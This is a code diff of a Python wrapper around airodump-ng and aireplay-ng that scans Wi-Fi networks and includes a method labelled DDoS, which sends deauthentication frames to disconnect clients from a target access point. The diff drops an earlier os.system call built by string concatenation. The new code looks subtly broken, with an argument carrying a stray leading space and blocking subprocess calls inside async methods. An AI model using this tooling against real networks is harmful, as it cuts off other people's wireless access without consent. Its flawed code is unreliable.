@@ -35,22 +35,25 @@ class Airodump:
         self.interface = interface
         self.command = 'airodump-ng'
 
-    async def general_scan(self):
+    def general_scan(self):
         out = sp.check_output(
             [self.command, '--output-format', 'csv', '-w', 'general_scan', self.interface])
+
+    async def channel_scan(self, channel):
+        out = sp.check_output([self.command, '-c', channel, '--output-format',
+                              'csv', '-w', 'channel_scan', self.interface])
 
 
 class Aireplay:
 
-    def __init__(self, ap):
+    def __init__(self, ap, interface):
         self.ap = ap
         self.command = 'aireplay-ng'
+        self.interface = interface
 
-    async def DDoS(self, interface):
-        await self.channel(interface)
-        os.system('sudo ' + self.command + ' -0 10 -a ' +
-                  self.ap.bssid + ' ' + interface)
-
+    async def DDoS(self):
+        sp.check_output([self.command, ' -0', '10', '-a',
+                        self.ap['AP_MAC'], self.interface])
         return 1
 
     async def channel(self, interface):
